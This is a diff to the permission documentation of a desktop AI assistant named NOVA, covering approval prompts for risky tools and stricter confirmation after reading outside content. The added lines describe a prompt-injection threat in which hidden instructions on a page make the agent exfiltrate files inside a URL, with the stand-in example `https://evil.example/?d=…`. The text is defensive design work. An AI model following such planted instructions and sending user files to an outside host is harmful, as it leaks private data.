@@ -182,8 +182,10 @@ restaurant?" finds "is allergic to peanuts" (can be turned off). Edit memories i
 * Risky tool calls (shell, Python, delete/move/rename, overwrite, kill, shutdown, typing) always ask first.
   "Always allow" is scoped: file changes inside **one folder**, typing into **one app**, or sleep.
 * After a request has read web pages or files, every side-effect tool asks (with a warning) and "Always allow"
-  is off — a hostile page cannot quietly trigger actions.
-* Before a file is overwritten, deleted or moved, the prompt shows exactly what changes (a coloured diff, or what
+  is off — a hostile page cannot quietly trigger actions. Fetching a page is a side effect too when the address
+  was made up: an address that did not come from you, a search result or a link on a page NOVA read asks first,
+  so hidden instructions cannot send your files out inside a URL (`https://evil.example/?d=…`).
+* Before a file is overwritten (also by copying over it), deleted or moved, the prompt shows exactly what changes (a coloured diff, or what
   goes to the Trash / would be replaced).
 * Text that comes from outside — web pages, files, email, calendar invitations, selected text, MCP servers, Shortcuts —
   never gets "always allow": every action after it asks.
